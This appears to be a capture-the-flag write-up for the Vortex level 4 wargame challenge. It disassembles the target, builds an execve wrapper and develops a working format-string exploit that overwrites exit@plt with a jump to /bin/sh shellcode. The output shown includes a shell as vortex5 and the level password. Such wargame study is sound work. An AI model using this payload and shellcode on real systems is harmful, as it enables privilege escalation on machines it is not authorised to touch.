Dump of assembler code for function main:
```assembly
   0x0804844d <+0>:     push   ebp
   0x0804844e <+1>:     mov    ebp,esp
   0x08048450 <+3>:     and    esp,0xfffffff0
   0x08048453 <+6>:     sub    esp,0x10
   0x08048456 <+9>:     cmp    DWORD PTR [ebp+0x8],0x0		#if num of args == 0
   0x0804845a <+13>:    je     0x8048468 <main+27>
   0x0804845c <+15>:    mov    DWORD PTR [esp],0x0
   0x08048463 <+22>:    call   0x8048330 <exit@plt>
   0x08048468 <+27>:    mov    eax,DWORD PTR [ebp+0xc]		
   0x0804846b <+30>:    add    eax,0xc
   0x0804846e <+33>:    mov    eax,DWORD PTR [eax]		#eax = env[2]
   0x08048470 <+35>:    mov    DWORD PTR [esp],eax
   0x08048473 <+38>:    call   0x8048310 <printf@plt>		#printf... vulnrable to format string attack
   0x08048478 <+43>:    mov    DWORD PTR [esp],0x0
   0x0804847f <+50>:    call   0x8048330 <exit@plt>
```

using a c file to pass 0 args:
```c
#include<stdio.h>                                                                         
#include<stdlib.h>                                                                        
#include<unistd.h>                                                                        
                                                                                          
int main(int argc, char* argv[]) {                                                                              
                                                                                          
        char* arg[] = {0x0};                                                              
        char* env[] = {"/vortex/vortex4",
			"AAAA",
			argv[1],
			argv[2]};                                   
        execve("/vortex/vortex4", arg, env);                                              
        perror("execve");                                                                 
        return 0;                                                                         
}
```
indeed it prints cccc...  
ok, we see that the program exits with exit(), so we can't use regular return address override (overwritting the return address)  
but we can overwrite the address to which exit@plt jumps to...  
we need to overwrite to about 0xffffdfc4 (where env are)  
exit@plt:
```assembly
   0x8048330 <exit@plt>:        jmp    *0x804a014
   0x8048336 <exit@plt+6>:      push   $0x10
   0x804833b <exit@plt+11>:     jmp    0x8048300
```
so let's write to address 0x0804a014...  
We will use the “Magic Formula” to calculate our format string exploit. (big indian)  
$(python -c 'print "AAAABBBB" + ".%p" * 200') $(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')  
-->AAABBBB.0xf7ffd000.0x804849b.0xf7fcd000.0x8048490.(nil).(nil).0xf7e3cad3.(nil).0xffffdc84.0xffffdc88.0xf7feae6a.(nil).0xffffdc84.0xffffdc24.0x804a018.0x804822c.0xf7fcd000.(nil).(nil).(nil).0xe0fda028.0xd8df6438.(nil).(nil).(nil).(nil).0x8048350.(nil).0xf7ff0660.0xf7e3c9e9.0xf7ffd000.(nil).0x8048350.(nil).0x8048371.0x804844d.(nil).0xffffdc84.0x8048490.0x8048500.0xf7feb300.0xffffdc7c.0x1c.(nil).(nil).0xffffdd63.0xffffdd73.0xffffdd77.0xffffdfd8.(nil).0x20.0xf7fdbba0.0x21.0xf7fdb000.0x10.0x178bfbff.0x6.0x1000.0x11.0x64.0x3.0x8048034.0x4.0x20.0x5.0x9.0x7.0xf7fdc000.0x8.(nil).0x9.0x8048350.0xb.0x138c.0xc.0x138d.0xd.0x138c.0xe.0x138c.0x17.0x1.0x19.0xffffdd4b.0x1f.0xffffdfe8.0xf.0xffffdd5b.(nil).(nil).(nil).(nil).(nil).0x83000000.0x20c44446.0xf0eb8fa5.0x71f31f3a.0x690aefa3.0x363836.0x2f000000.0x74726f76.0x762f7865.0x6574726f.0x62003478.0x41006262.0x42414141.0x2e424242 --> offset = 107  

we see that we need editional 0-3 chars to align with the stack...  
note: %hn is 3 chars, while %p is only 2, so we need to adjust the number  
of "\x90" we put in our buffer (I used it do align our buffers with the stack...) --> i used 2  

putting all together we get:  

r $(python -c 'print"\x14\xa0\x04\x08\x16\xa0\x04\x08%.57276x%107$hn%.8243x%108$hn"') $(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80\x90\x90"')

Program received signal SIGSEGV, Segmentation fault.
0xfff7dfc4 in ?? ()

great! now we need just to adjust... (to 0xffffdf84)  

./execve $(python -c 'print"\x14\xa0\x04\x08\x16\xa0\x04\x08%.57212x%107$hn%.8315x%108$hn"') $(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80\x90\x90"')

we get:  
$ whoami
vortex5
$ cat /etc/vortex_pass/vortex5
:4VtbC4lr

